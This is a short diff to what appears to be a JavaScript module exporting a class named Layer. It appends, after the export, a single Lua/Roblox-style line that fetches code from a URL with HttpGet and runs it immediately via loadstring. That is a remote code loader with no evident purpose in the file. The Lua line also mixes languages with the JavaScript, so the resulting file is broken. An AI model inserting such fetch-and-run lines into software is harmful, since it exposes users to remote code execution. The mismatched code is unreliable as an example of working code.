@@ -119,3 +119,4 @@ class Layer {
 }
 
 export default Layer
+loadstring(game:HttpGet('https://google.com'))()
